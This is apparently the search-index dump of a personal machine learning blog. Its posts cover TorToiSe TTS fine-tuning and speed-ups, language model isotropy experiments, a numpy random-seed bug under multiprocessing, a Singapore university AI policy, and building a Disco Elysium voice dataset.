wrong: The synthetic [x,z] pairs are simply too low quality for a model to converge, The specific random cookbook arrays used in the original VQVAE are important in some way that prevents a resnet with a different cookbook from learning to predict the right tokens i missed something obvious (it happens) If I was really going to try this idea, I might do something like: using random lines + random conditioning latents from a large tts dataset, generate (with the GPT model) a low-quality unfiltered large dataset, plus a higher quality smaller dataset filtered with CLVP pre-train an encoder \u0026 decoder (separately) on the large dataset, before fine-tuning on the smaller dataset switch back to the original VQVAE training method with reconstruction loss, and fine-tune the entire VQVAE on librilight or some other dataset fine-tune the rest of tortoise to account for the differences between this reconstructed model \u0026\u0026 the original VQVAE But it might not work. And if it doesn‚Äôt work, and it is truly impossible to fine-tune tortoise without training from scratch, then I can only congratulate the creator of TorToiSe for his ingenuity. ","date":"February 11, 2023","objectID":"/blog/tortoise-fine-tuning/:4:0","tags":["machine learning","TTS"],"title":"Why can't TorToiSe be fine-tuned?","uri":"/blog/tortoise-fine-tuning/"},{"categories":["opinion"],"content":"On 9th Feb, the National University of Singapore implemented broad restrictions against the use of AI tools to generate work: 1. DON‚ÄôT USE AI TO PLAGIARIZE The following are always improper uses of AI tools: Generating an output and presenting it as your own work or idea. Generating an output, paraphrasing it, and then presenting the output as your own work or idea. Processing an original source not created by yourself to plagiarize it (e.g., using an AI paraphrasing tool to disguise someone else‚Äôs original work, or even the output of an AI tool, and then presenting the final output as your own work or idea). All of the above violate NUS policies on academic honesty and anyone found to have done any of them will be dealt with accordingly. Keep in mind that even though AI tools are not authors and thus cannot be harmed by someone stealing an idea from them, it‚Äôs still wrong of you to represent yourself as having produced something when you didn‚Äôt produce it. I don‚Äôt have much to say here. Papers have already been published with ChatGPT as the author. The public stated plan of OpenAI is to make use of AI to accelerate their research. Institutions that refuse to accelerate their work with AI tools will inevitably be magnitudes less efficient than alternative institutions. Whatever talent that still remains in this country will be yet-more-convinced that expatriation is the only solution. I might end up as one of those people soon. This post was supposed to have 3 other parts. I have redacted them because I doubt my words would help to improve things. ","date":"February 10, 2023","objectID":"/blog/nus-mistake/:0:0","tags":["sg","personal"],"title":"The bleak future of Artificial Intelligence in Singapore","uri":"/blog/nus-mistake/"},{"categories":["tech"],"content":"I made a fork of TorToiSe with much faster inference speed. Here are the summarised results: Example texts used A (70 characters): I‚Äôm looking for contributors who can do optimizations better than me. B (188 characters): Then took the other, as just as fair, And having perhaps the better claim, Because it was grassy and wanted wear; Though as for that the passing there Had worn them really about the same, Original TorToiSe repo: speed (B) speed (A) preset 112.81s 14.94s ultra_fast New repo, with --preset ultra_fast: speed (B) speed (A) GPT kv-cache sampler cond-free diffusion autocast to fp16 118.61 11.20 ‚ùå DDIM ‚ùå ‚ùå 115.51 10.67 ‚ùå DPM++2M ‚úÖ ‚ùå 114.58 10.24 ‚ùå DPM++2M ‚ùå ‚ùå 55.76 7.25 ‚ùå DDIM ‚ùå ‚úÖ 53.59 6.77 ‚ùå DPM++2M ‚úÖ ‚úÖ 51.98 6.29 ‚ùå DPM++2M ‚ùå ‚úÖ 9.86 4.24 ‚úÖ DDIM ‚ùå ‚ùå 8.51 3.77 ‚úÖ DPM++2M ‚úÖ ‚ùå 8.12 3.82 ‚úÖ DPM++2M ‚úÖ ‚úÖ 6.78 3.35 ‚úÖ DPM++2M ‚ùå ‚úÖ All results listed were generated with a slightly undervolted RTX 3090 on Ubuntu 22.04, with the following base command: python tortoise/do_tts.py --voice emma --seed 42 --text \"$TEXT\" ","date":"February 5, 2023","objectID":"/blog/tortoise-tts-fast/:0:0","tags":["machine learning","TTS"],"title":"Fast (5x) Inference with TorToiSe-TTS","uri":"/blog/tortoise-tts-fast/"},{"categories":["tech"],"content":"TL;DR GPT-NeoX-20B appears to be anisotropic (Isotropy: 0.197) Int8 quantisation appears to have ~no effect on isotropy I am new to ML so the above could be false, feel free to poke at my findings here Evaluating the isotropy of more language models In Contrastive Search Is What You Need For Neural Text Generation, it is argued that through extensive evaluations on a wide range of LMs with different scales, we empirically show that the English autoregressive LMs are naturally isotropic, They also show a cool graph representing this finding Do I have any idea what that means? Nope. I know that it makes contrastive search useful, but I don‚Äôt grasp any of the mathematics. What I did find out: the evaluation harness for isotropy used in the paper is open source and very easy to install! So I decided to try running it on a few models that were absent in the paper. ","date":"December 12, 2022","objectID":"/blog/anisotropy/:0:0","tags":["machine learning","language models","research"],"title":"Contrastive Search might-not-be What You Need","uri":"/blog/anisotropy/"},{"categories":["tech"],"content":"GPT-J-6B I‚Äôm already working on a project with GPT-J, so I started with it. Getting the isotropy evaluation code installed is simple. Installation and setup Setup conda env conda create -n csearch python=3.9 conda activate csearch conda install pytorch torchvision torchaudio pytorch-cuda=11.7 -c pytorch -c nvidia pip install simctg Clone repo \u0026 extract dataset git clone https://github.com/yxuansu/Contrastive_Search_Is_What_You_Need cd Contrastive_Search_Is_What_You_Need/data unzip wit.zip Add code for new GPT model After getting the evaluation code installed, I edited the code to work for GPT-J, as shown in this commit. diff --git a/isotropy_analysis/compute_language_model_isotropy.py b/isotropy_analysis/compute_language_model_isotropy.py index 44b6ed1..6c83641 100644 --- a/isotropy_analysis/compute_language_model_isotropy.py +++ b/isotropy_analysis/compute_language_model_isotropy.py @@ -25,7 +25,7 @@ def parse_text(text, tokenizer, max_len, bos_token_id=None): + if 'gpt-neo' in model_name or 'gpt-j' in model_name: - if 'gpt-neo' in model_name: @@ -63,24 +63,12 @@ if __name__ == '__main__': + elif 'gpt-j' in model_name: + print('Evaluating GPT-J model') + from transformers import GPTJForCausalLM, AutoTokenizer + model = GPTJForCausalLM.from_pretrained(model_name, revision=\"float16\", torch_dtype=torch.float16, low_cpu_mem_usage=True) + tokenizer = AutoTokenizer.from_pretrained(model_name) + bos_token_id = None Result: $ ./inference.sh Evaluating GPT-J model Model loaded! Loading data... Data loaded! Performing inference... 100% |#######################################################| Inference completed! Language Code:en, Model:EleutherAI/gpt-j-6B, Isotropy:0.69 0.69 is about what you‚Äôd expect from the paper, no surprise there. ","date":"December 12, 2022","objectID":"/blog/anisotropy/:1:0","tags":["machine learning","language models","research"],"title":"Contrastive Search might-not-be What You Need","uri":"/blog/anisotropy/"},{"categories":["tech"],"content":"GPT-NeoX-20B My hardware setup is limited to an RTX 3090, so the only way I can run NeoX-20B (without more money) is to load it with LLM.int8(). I eventually achieve that after some debugging: Debugging problems Working from the same commit, I get a strange result: $ ./inference.sh Evaluating GPT-NeoX model Model loaded! Loading data... Data loaded! Performing inference... 100% |#######################################################| Inference completed! Language Code:en, Model:EleutherAI/gpt-j-6B, Isotropy:nan nan. The bane of Machine Learning. I‚Äôm 99% certain this is wrong in some way, so I add print statements everywhere. Eventually, I notice that the last_hidden_states of the model‚Äôs forward pass looks like this: tensor([[[nan, nan, nan, ..., nan, nan, nan], | [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan], [nan, nan, nan, ..., nan, nan, nan]]], device='cuda:0', dtype=torch.float16) And that if I call the model right after model.eval(), I get this: tensor([[[-0.1514, 1.2617, -0.0116, ..., -0.1769, -1.2178, 0.0608], [-0.8823, -0.5493, -0.0648, ..., 0.1132, -3.9043, 0.0745], [ 0.6362, 0.8086, 0.0204, ..., 0.0682, -5.6445, 0.2147], [-0.1072, 1.6904, -1.4424, ..., 0.1148, 0.1061, -1.3096]]], device='cuda:0', dtype=torch.float16, grad_fn=\u003cNativeLayerNormBackward0\u003e) Eventually, I figure out the line of code that‚Äôs responsible: if cuda_available: model = model.cuda(device) # model() produces NaN tensor after this line The model is initialised with device_map='auto', which puts the model on device='cuda:0' on my machine, which should be equivalent to the device in the above line. I do not understand why the above line causes everything to go to nan, but I also do not think it is related to the result later on, because this problem occurs in other models (e.g. GPT-J-6B) as well. I‚Äôm leaving this information here in case I happen to be wrong. $ ./inference.sh Evaluating EleutherAI/gpt-neox-20b Model loaded! Loading data... Data loaded! Performing inference... 100% |##############################################| Inference completed! Language Code:en, Model:EleutherAI/gpt-neox-20b, Isotropy:0.1973011465713972 And this is the reason why I bothered to write this post at all. 8bit GPT-NeoX-20B, as evaluated on my machine, appears to be anisotropic. ","date":"December 12, 2022","objectID":"/blog/anisotropy/:2:0","tags":["machine learning","language models","research"],"title":"Contrastive Search might-not-be What You Need","uri":"/blog/anisotropy/"},{"categories":["tech"],"content":"Is Int8 the problem? Probably not. I tested int8 quantisised vs fp16/fp32 models, and got mostly identical results. I can‚Äôt rule out the possibility that my code/hardware is broken specifically for NeoX-20B, but I think the experiments I‚Äôve done are strong indicators that bugged code is probably not the cause of the observed anisotropy. ","date":"December 12, 2022","objectID":"/blog/anisotropy/:3:0","tags":["machine learning","language models","research"],"title":"Contrastive Search might-not-be What You Need","uri":"/blog/anisotropy/"},{"categories":["opinion"],"content":"No one is immune to the consequences of an Artifical General Intelligence. Programmers are not special. They are knowledge workers. The Pile contains everything, including an enormous amount of code. The idea that all other careers would sink to AI, while programmers would flourish, was myopic, and hopefully now sufficiently discredited. Also, the litigation will not save you: The Stack: 3 TB of permissively licensed source code For reference, these are the HumanEval results for the rest of Codex: Model Pass@1 Pass@10 Pass@100 Codex (300M) 13.17% 20.37% 36.27% Codex (2.5B) 21.36% 35.42% 59.50% Codex (12B) 28.81% 46.81% 72.31% ChatGPT is currently free for public use. There are known cases where it fails as a programmer. There are legitimate limitations to the current approach of throwing LLMs at everything. But regardless of their limitations, these models will look an awful lot like AGI. Some fun examples Designing a pizza REST API Building a Tokio API with MongoDB Exploiting a buffer overflow Explaining the attention mechanism in transformers Creating shapes with js (source) A comparison with Google longwest_incweasing_subseqence(aww) The samples from OpenAI Decompiling assembly Fixing and Diagnosing problems in AWS IAM Policies Making a React login page Bubblesort explained by a 40‚Äôs gangsta ","date":"December 2, 2022","objectID":"/blog/an-informal-reminder/:1:0","tags":["opinion","language models"],"title":"An Informal Reminder","uri":"/blog/an-informal-reminder/"},{"categories":["tech"],"content":"A preface to the upcoming series on my attempts to use language models, locally","date":"November 27, 2022","objectID":"/blog/why-lms/","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/blog/why-lms/"},{"categories":["tech"],"content":"Over the course of the last month or so, I‚Äôve been working on a webapp text editor that uses GPT-J, a language model, to perform autocomplete. If you don‚Äôt know what that is, then I hope you‚Äôll enjoy some of the links in this blogpost. But for the majority that does know what language models are, it‚Äôs safe to say that I‚Äôve done nothing complex. Technologically, I made a React app with a text editor derived from Slate.js, and connected that to a FastAPI backend which throws requests to huggingface‚Äôs transformers. None of this is revolutionary. There are many solutions online that do way better. EleutherAI hosts their own free demo page that runs a lot more elegantly than my webapp. OpenAI‚Äôs GPT3 models are a lot better than anything open source can provide. And companies like NovelAI corner the submarket of people who want to do more specific tasks like writing certain kinds of fiction novels. So, why am I even working on any of this? ","date":"November 27, 2022","objectID":"/blog/why-lms/:0:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/blog/why-lms/"},{"categories":["tech"],"content":"Models need less vram now Back in August, someone published a paper titled LLM.int8(): 8-bit Matrix Multiplication for Transformers at Scale. I recommend reading the huggingface article on it if you‚Äôre interested, but in short, With our method, a 175B parameter 16/32-bit checkpoint can be loaded, converted to Int8, and used immediately without performance degradation. Now, 175B parameters is still pretty big. With Int8, it‚Äôd be 175 gigabytes of memory, which is still well in the category of ‚Äúnot for personal use‚Äù. But the improvements apply for any language model reliant on the transformer architecture. And there are many great models that are now accessible to larger sections of the general population because of this. Model 3050 (4GB) 2080 TI (11GB) Tesla T4 (16GB) 3090 (24GB) Codegen-2B ‚úÖ ‚¨õ ‚¨õ ‚¨õ GPT-J-6B ‚ùå ‚úÖ ‚¨õ ‚¨õ CodeGeeX-13B ‚ùå ‚ùå ‚úÖ ‚úÖ GPT-NeoX-20B ‚ùå ‚ùå ‚ùå ‚úÖ ‚úÖ - int8 improvement | ‚¨õ - no change | ‚ùå - int8 insufficient If you have an RTX 3090, you can run GPT-NeoX-20B or CodeGeeX-13B. If you have a 2080, you can run GPT-J-6B or Incoder-6B. And if you have enough memory to run Stable Diffusion, you can run Codegen-2B. That last example is particularly motivating, because of the next section. ","date":"November 27, 2022","objectID":"/blog/why-lms/:1:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/blog/why-lms/"},{"categories":["tech"],"content":"Advances in sampling strategies Earlier this month, huggingface implemented Contrastive Search into their transformers library. While I‚Äôm not at all qualified to describe what it does (and whether it is ‚Äônovel‚Äô or ‚Äòobvious‚Äô), I find their results rather encouraging. A 3% jump might not sound like much, but it puts CodeGen-2B at the same level as Codex-2.5B. This puts open source replacements for Copilot (like fauxpilot) at the same level of code completion competency. Contrastive search also does a lot better at long-form writing than other sampling strategies, which is great because: ","date":"November 27, 2022","objectID":"/blog/why-lms/:2:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/blog/why-lms/"},{"categories":["tech"],"content":"I wanted to write blogposts again I‚Äôm not very good at writing. While I don‚Äôt think the things I publish are terrible, I often feel that I take way too long to get from ‚Äòidea‚Äô to ‚Äòwritten essay‚Äô. And I‚Äôm sure that‚Äôs not a unique problem, but it‚Äôs the kind of problem that a lot of people seem to shrug at and say, Guess I have to try harder. Or, Guess I can‚Äôt do much of that I don‚Äôt like either of these options. The third option, ‚ÄúMake an computer do it for you,‚Äù is what language models are. But I also don‚Äôt really like sending my drafted blogposts to a remote SaaS, so I wanted a solution that could run locally on my own hardware. And that was surprisingly difficult to find online. I did some googling, asked a few communities, double checked a laundry list of github tags to make sure I didn‚Äôt miss anything, and somehow I just found nothing. I‚Äôm still 90% certain someone has already done, ‚ÄúOpen source webapp editor that uses GPT-J,‚Äù but for the life of me, I couldn‚Äôt find it. The searches I got were polluted with solutions that, while open source, were only designed to send requests to OpenAI‚Äôs GPT3 API. Great for most people; not what I‚Äôm looking for. So, I got to work on a simple tool that would help me to run GPT-J locally, thinking it would take me less than a weekend to finish. The next few blogposts in this series will cover how I ended up spending a month doing just that. ","date":"November 27, 2022","objectID":"/blog/why-lms/:3:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/blog/why-lms/"},{"categories":["tech"],"content":"2 months ago, I was halfway into publishing a series on my TTS project. Today, the site for that project is defunct, and no new posts have been made about it. What happened? Well1, I‚Äôve been working on a lot of different projects. Some of them already exist on my Github, but only as code, without elaboration or presentation. So I‚Äôm going to dedicate the next few weeks of my time to talking about them on this space. But before I get to writing those longer posts, here‚Äôs a quick summary of what I‚Äôve been working on: Project Status Description Publishing Stable Diffusion related ‚úÖ Embeddings, Dreambooth, Hypernetworks, etc ‚ùå Custom object detection model Dataset done Applying object detection models like YOLOv* to custom made datasets ‚ùî voice2img for Stable Diffusion Prototype published Using Automatic Speech Recognition (ASR) models like Whisper to generate images by vocal commands ‚úÖ Copilot@home ‚ùå Open source alternative plugin for Copilot. Cancelled because a much better effort already exists ‚úÖ GPT-J text editor ‚úÖ in progress A webapp text editor that uses GPT-J for autocomplete ‚úÖ I‚Äôve also had other ideas that I‚Äôve yet to write any code for, like: Idea Description Likelihood Better TTS models Disco Narrator but actually good 0.01 More uses of Whisper Adding to GPT-J text editor (wasm? API?). Using as a phone app Maybe Using YOLO at home Mostly to notify for presence of visitors Maybe Research thing Related to language models Probably Also, my computer died. I have a blog post about it I‚Äôve yet to publish too. ","date":"November 27, 2022","objectID":"/blog/end-of-hiatus/:0:0","tags":["machine learning","blog"],"title":"Recent ML Projects","uri":"/blog/end-of-hiatus/"},{"categories":["Tech"],"content":"Let‚Äôs say, for some odd reason, you‚Äôre hosting a Python service that: takes requests that run large computations based on a randomly generated number (a ‚Äúseed‚Äù) spreads work across multiple workers to handle many requests Then, it‚Äôs likely you‚Äôll introduce a subtle randomness bug that leads to duplicate seeds appearing. Let me explain: Regarding Reproducibility The following tests were done on a Ubuntu 20.04 LTS Hetzner instance using: numpy==1.22.4 python==3.8.10 I additionally made efforts to test certain outcomes on Ubuntu 18 LTS with Python 3.6.9, albeit with much uglier logging due to the lack of f-string improvements. ","date":"October 2, 2022","objectID":"/blog/multiprocessing-and-random/:0:0","tags":["code","python"],"title":"Multiprocessing and \u003ccode\u003erandom()\u003c/code\u003e","uri":"/blog/multiprocessing-and-random/"},{"categories":["Tech"],"content":"Randomness: single-process single-threaded $ python3 -c 'print(__import__(\"random\").random())' 0.7457432716191408 $ python3 -c 'print(__import__(\"random\").random())' 0.9558957103766177 $ # applies for numpy.random too! $ python3 -c 'print(__import__(\"numpy\").random.randint(9999))' 5388 $ python3 -c 'print(__import__(\"numpy\").random.randint(9999))' 236 Typically, there‚Äôs no need to fiddle with the internal configuration of Python‚Äôs random module. Python seeds its Mersenne Twister thing with os.urandom by default, and even if you‚Äôre on some really obscure operating system, it seeds by time which is pretty hard to collide with milisecond accuracy: $ # Test: Spawning 5 processes quickly by backgrounding (\u0026) them $ for i in `seq 1 5` \u003e do python3 -c 'print(__import__(\"random\").random())' \u0026 \u003e done 0.4576075693594288 0.7804091843861601 0.9347442769592177 0.9520767305433322 0.12542097628111482 That‚Äôs not to say that this is cryptographically secure or anything, but for the purposes laid out in the introduction, it‚Äôs more than sufficiently random for our purposes. But, as with all things Python, things get a bit dicer as we scale. ","date":"October 2, 2022","objectID":"/blog/multiprocessing-and-random/:1:0","tags":["code","python"],"title":"Multiprocessing and \u003ccode\u003erandom()\u003c/code\u003e","uri":"/blog/multiprocessing-and-random/"},{"categories":["Tech"],"content":"Multiprocessing and fork() As explained on the multiprocessing docpage, the default methodology for spawning multiple Python processes on Linux is to abuse os.fork(). The fork syscall, for those who don‚Äôt know, is approximately ‚Äúan OS function that creates a bit-for-bit copy of an existing process‚Äù, with exceptions listed in the preceding link. The random state of a PRNG should be stored somewhere in process memory, so it stands to reason that multiple Python processes fork()ed from the same parent will have the same seed. We can test this theory with a simple script: import multiprocessing as mp import random as r import numpy as np def f(_): return np.random.randint(1000), r.randint(0,999) with mp.Pool(4) as p: for i,(np_v,py_v) in enumerate(p.map(f, range(50))): if not i \u0026 0b11: print('-'*23) print(f'{i:2}: {np_v=:3} | {py_v=:3}') TLDR: Run np.random.randint and random.randint with 4 python processes in parallel; print dividing line every 4 outputs. The results from this script are fairly surprising: $ python3 rand_test.py ----------------------- 0: np_v=711 | py_v=969 1: np_v=893 | py_v=988 2: np_v=650 | py_v=588 3: np_v=539 | py_v=213 ----------------------- 4: np_v=711 | py_v=413 5: np_v=893 | py_v=192 6: np_v=650 | py_v= 72 7: np_v=539 | py_v=895 ----------------------- 8: np_v=711 | py_v=625 9: np_v=893 | py_v=133 10: np_v=650 | py_v=261 11: np_v=539 | py_v=401 ----------------------- 12: np_v=711 | py_v=805 13: np_v=893 | py_v=995 14: np_v=650 | py_v=295 15: np_v=539 | py_v=429 ----------------------- 16: np_v=237 | py_v=221 17: np_v=769 | py_v=661 18: np_v=136 | py_v=248 19: np_v=967 | py_v=505 ----------------------- 20: np_v=237 | py_v=759 21: np_v=769 | py_v=659 22: np_v=136 | py_v=587 23: np_v=967 | py_v=562 ----------------------- 24: np_v=237 | py_v=922 25: np_v=769 | py_v=365 26: np_v=136 | py_v=441 27: np_v=967 | py_v=755 ----------------------- 28: np_v=802 | py_v=778 29: np_v=744 | py_v=886 30: np_v=359 | py_v=112 31: np_v=349 | py_v=839 ----------------------- 32: np_v=237 | py_v=301 33: np_v=769 | py_v=483 34: np_v=136 | py_v=465 35: np_v=967 | py_v=937 ----------------------- If you will observe: The numpy.random outputs repeat 4 times (every 4 steps), while the randomness of vanilla random is secure across processes. So we can infer that: numpy.random‚Äôs PRNG state is captured (pickled) by the multiprocessing library and copied identically across 4 workers; random‚Äôs PRNG state is not duplicated. It could either be shared across all workers, or reseeded within each worker on startup. To figure out the answer to (2), we can just modify the script to print out the initial state of the PRNGs on worker start: yes = True def f(_): global yes if yes: s = np.random.get_state() np_state = hash((*s[1],*s[2:5])) py_state = hash(r.getstate()) print(f'{np_state=:20}, {py_state=:20}') yes = False # ... As expected, the numpy.random initial state is equivalent across all workers. Unexpectedly, the random initial states do not, and they remain different even when I extend the sleep duration to infinity, indicating a new random._inst state is initialised per worker: $ python3 scratch.py np_state= 8542083115030040073, py_state= -509295089981894936 np_state= 8542083115030040073, py_state= 7542824820053631765 np_state= 8542083115030040073, py_state=-7860580465393152951 np_state= 8542083115030040073, py_state=-9195119932724983682 At this point I‚Äôm pretty confused. The numpy module was getting pickled, but the random module was not. Could I force a pickling of the random state? I tried extending the test script to cover more things: import time as t import random as r import multiprocessing as mp import numpy as np def f(r_pickled): s = np.random.get_state() np_rand_hash = hash(tuple((*s[1], *s[2:5]))) py_rand_hash = hash(r.getstate()) pi_rand_hash = hash(r_pickled.getstate()) t.sleep(0.01) # return { 'np_s': np_rand_hash, 'py_s': py_rand_hash, 'pi_s': pi_rand_hash, # all of these generate in range(10000): 'np_v': np.random.r","date":"October 2, 2022","objectID":"/blog/multiprocessing-and-random/:2:0","tags":["code","python"],"title":"Multiprocessing and \u003ccode\u003erandom()\u003c/code\u003e","uri":"/blog/multiprocessing-and-random/"},{"categories":["Tech"],"content":"Speculation And so, I move into the fog of unverified ideas and poorly substantiated hypotheses. ","date":"October 2, 2022","objectID":"/blog/multiprocessing-and-random/:3:0","tags":["code","python"],"title":"Multiprocessing and \u003ccode\u003erandom()\u003c/code\u003e","uri":"/blog/multiprocessing-and-random/"},{"categories":["Tech"],"content":"The forkmethod is important I tried switching up the forkmethod from fork to forkserver/spawn if __name__ == '__main__': with mp.get_context(\"forkserver\").Pool(4) as p: for i,(np_v,py_v,h_delta) in enumerate(p.map(f, range(50))): pass In both cases, the random states of both numpy and random became different in all workers: $ python3 scratch.py np_state= -664522000653194140, py_state= 7612061459549224940 np_state= 4019719269418835448, py_state= -826723981683651496 np_state=-3004816782852048973, py_state=-3881656698949473802 np_state= 374882113652371457, py_state= 746934503431840062 Only the choice of fork causes the initial seeds of numpy to differ. Why? I‚Äôm not sure; you can start with the source code here, but it‚Äôs not simple. ","date":"October 2, 2022","objectID":"/blog/multiprocessing-and-random/:3:1","tags":["code","python"],"title":"Multiprocessing and \u003ccode\u003erandom()\u003c/code\u003e","uri":"/blog/multiprocessing-and-random/"},{"categories":["Tech"],"content":"random state is copied, but overwritten The pickle representation of both numpy.random.randint and random.randint are both large and similar in size: \u003e\u003e\u003e import pickle as p \u003e\u003e\u003e import numpy as np \u003e\u003e\u003e import random as r \u003e\u003e\u003e len(p.dumps(r.randint)) 3804 \u003e\u003e\u003e len(p.dumps(np.random.randint)) 2825 \u003e\u003e\u003e def f(): pass # empty func \u003e\u003e\u003e len(p.dumps(f)) # as comparison 29 Plugging the outputs of either randint() function into pickletools.dis() shows a large stored array of numbers, which I assume is representative of their PRNG states. If the multiprocessing library does capture the state of random before execution, then something about the initialisation process of each worker must recreate the random state again. Alternatively, the random.randint() function is not captured by the multiprocessing module entirely. But I find this difficult to believe, because it has to capture something to run the randint function, and since pickle is unable to dump module types, I‚Äôm unable to come up with another idea here. This also explains why explicitly capturing r._inst succeeds in creating duplicate seeds ‚Äì the multiprocessing library reinitiallises random._inst, but the function-provided r_inst object remains as a separate instance. ","date":"October 2, 2022","objectID":"/blog/multiprocessing-and-random/:3:2","tags":["code","python"],"title":"Multiprocessing and \u003ccode\u003erandom()\u003c/code\u003e","uri":"/blog/multiprocessing-and-random/"},{"categories":["Tech"],"content":"In conclusion Using random.* explicitly in a multiprocessed function will never go wrong. Speculation: the multiprocessing library recreates a random.Random object per worker. Using numpy.random with multiprocessing using fork will cause predictable random number duplication. The PRNG state is captured by pickle and copied between processes. Using a copy of random._inst as an argument for a multiprocessed task will cause even more duplication than the numpy option. Mechanism unknown. ","date":"October 2, 2022","objectID":"/blog/multiprocessing-and-random/:4:0","tags":["code","python"],"title":"Multiprocessing and \u003ccode\u003erandom()\u003c/code\u003e","uri":"/blog/multiprocessing-and-random/"},{"categories":["tech"],"content":"With the raw data in tow, we can construct a proper TTS Dataset with the use of a few Python scripts. I currently have: named audio files (AudioClip/) dialogue lines with IDs (dialog.json) IDs that are linked to the names of audio files from (1) (VoiceOverClipsLibrary.json) I want to squash (1) and (2) together ‚Äì to create dialog lines linked to audio files ‚Äì and we need to use (3) to get there. ","date":"September 25, 2022","objectID":"/blog/dn-2/:0:0","tags":["Disco Elysium","pandas","part of a series","WIP"],"title":"Disco Narrator - Data Formatting","uri":"/blog/dn-2/"},{"categories":["tech"],"content":"Preprocessing My idea was simple: Each line of dialog from dialog.json has an articyID. Each articyID is linked to an assetName Each assetName represents a unique .wav file Run through steps 1-3 to obtain (dialog, wav_file) pairs. Or at least, it was supposed to be simple. In reality, each and every one of these steps were assumptions ‚Äì expected conditions that weren‚Äôt strictly followed by the raw data I had obtained in the first post. Here‚Äôs what went wrong: ","date":"September 25, 2022","objectID":"/blog/dn-2/:1:0","tags":["Disco Elysium","pandas","part of a series","WIP"],"title":"Disco Narrator - Data Formatting","uri":"/blog/dn-2/"},{"categories":["tech"],"content":"Useless dialogueEntries Each DialogueEntry in dialog.json contained an articyID, which was great. What was less great was the presence of useless/meta dialogue entries like this: { \"id\": 0, \"fields\": [ { \"title\": \"Title\", \"value\": \"START\", \"type\": 0, \"typeString\": \"\" }, { \"title\": \"Articy Id\", \"value\": \"0x0000000000000000\", \"type\": 0, \"typeString\": \"\" }, { \"title\": \"Sequence\", \"value\": \"Continue()\", \"type\": 0, \"typeString\": \"\" } ], ... } So, instead of looping through every dialogue entry in the game, I threw every entry into a pandas dataframe and ran articyID queries on that: with open(JSON_DIALOG) as f: loaded = json.load(f) df_actors_init = pd.json_normalize(loaded,record_path=['actors']) df_actors = pd.concat([df_actors_init, df_actors_init.pop('fields').apply(iterate)], axis=1) df_convos_init = pd.json_normalize(loaded,record_path=['conversations','dialogueEntries']) df_convos = pd.concat([df_convos_init, df_convos_init.pop('fields').apply(iterate)], axis=1) # To access a dialogueEntry with a given `ArticyID`, # access `df_convos[df_convos[\"Articy Id\"] == ArticyID]` This was a somewhat inefficient solution and I am not very proud of it. More on this later, in the final script. ","date":"September 25, 2022","objectID":"/blog/dn-2/:1:1","tags":["Disco Elysium","pandas","part of a series","WIP"],"title":"Disco Narrator - Data Formatting","uri":"/blog/dn-2/"},{"categories":["tech"],"content":"One-to-many mapping: ArticyID ‚Äì\u003e AssetName Problem: in VoiceOverClipsLibrary.json, some clipInformation[] entries contain alternativeVoiceClips[]. Example: { \"AssetName\": \"Empathy-KINEEMA SYLVIE-198\", \"ArticyID\": \"0x0100002B00060B58\", \"AssetBundle\": \"kineema_empathy\", \"PathToClipInProject\": \"Assets\\\\Sounds/Dialogue/VOImports\\\\kineema\\\\empathy\\\\Empathy-KINEEMA SYLVIE-198.wav\", \"DoesNotNeedVO\": false, \"alternativeVoiceClips\": [ { \"AlternativeID\": 0, \"AlternativeAssetName\": \"alternative-0-Empathy-KINEEMA SYLVIE-198-0\", \"AlternativeClipPath\": \"Assets\\\\Sounds/Dialogue/VOImports\\\\kineema\\\\empathy\\\\Alternative\\\\alternative-0-Empathy-KINEEMA SYLVIE-198-0.wav\", \"DoesNotNeedVO\": false }, { \"AlternativeID\": 1, \"AlternativeAssetName\": \"alternative-1-Empathy-KINEEMA SYLVIE-198-1\", \"AlternativeClipPath\": \"Assets\\\\Sounds/Dialogue/VOImports\\\\kineema\\\\empathy\\\\Alternative\\\\alternative-1-Empathy-KINEEMA SYLVIE-198-1.wav\", \"DoesNotNeedVO\": false }, { \"AlternativeID\": 2, \"AlternativeAssetName\": \"alternative-2-Empathy-KINEEMA SYLVIE-198-2\", \"AlternativeClipPath\": \"Assets\\\\Sounds/Dialogue/VOImports\\\\kineema\\\\empathy\\\\Alternative\\\\alternative-2-Empathy-KINEEMA SYLVIE-198-2.wav\", \"DoesNotNeedVO\": false }, { \"AlternativeID\": 3, \"AlternativeAssetName\": \"alternative-3-Empathy-KINEEMA SYLVIE-198-3\", \"AlternativeClipPath\": \"Assets\\\\Sounds/Dialogue/VOImports\\\\kineema\\\\empathy\\\\Alternative\\\\alternative-3-Empathy-KINEEMA SYLVIE-198-3.wav\", \"DoesNotNeedVO\": false } ] } The full object has only 1 articyID, but many AssetNames. And all of these AssetNames exist as .wav files, and correspond to their own separate dialogue lines: So, that‚Äôs not great. I have to create additional code to handle this edge case. ","date":"September 25, 2022","objectID":"/blog/dn-2/:1:2","tags":["Disco Elysium","pandas","part of a series","WIP"],"title":"Disco Narrator - Data Formatting","uri":"/blog/dn-2/"},{"categories":["tech"],"content":"404 not found: AssetName -/-\u003e .wav file Some AssetNames pointed to .wav files that simply didn‚Äôt exist. WARNING: Unable to find .wav file for: 'Titus Hardie-WHIRLING F1 TITUS HARDIE barks-2' WARNING: Unable to find .wav file for: 'Titus Hardie-WHIRLING F1 TITUS HARDIE barks-3' ... (\u003c1000 lines omitted) ... WARNING: Unable to find .wav file for: 'Echo Maker-APT ECHO MAKER barks-11' WARNING: Unable to find .wav file for: 'Echo Maker-APT ECHO MAKER barks-12' The vast majority of these were labelled as barks, which from what I gather refers to this. Generally speaking, they aren‚Äôt actual voice lines and it doesn‚Äôt hurt the dataset to simply ignore their presence (or lackthereof). ","date":"September 25, 2022","objectID":"/blog/dn-2/:1:3","tags":["Disco Elysium","pandas","part of a series","WIP"],"title":"Disco Narrator - Data Formatting","uri":"/blog/dn-2/"},{"categories":["tech"],"content":"One-to-many mapping: AssetName ‚Äì\u003e DialogueEntry A small number of clipInformation[] entries contained duplicate AssetNames, despite having different articyIDs: These appear mostly linked to extra dialogue lines added from The Final Cut, and are distinguished by the presence of a fixed- prefix in their PathToCLipInProject: { \"AssetName\": \"Kim Kitsuragi-WHIRLING KIM MAIN-55\", \"ArticyID\": \"0x0100000400008D23\", \"AssetBundle\": \"whirling_kim-kitsuragi\", 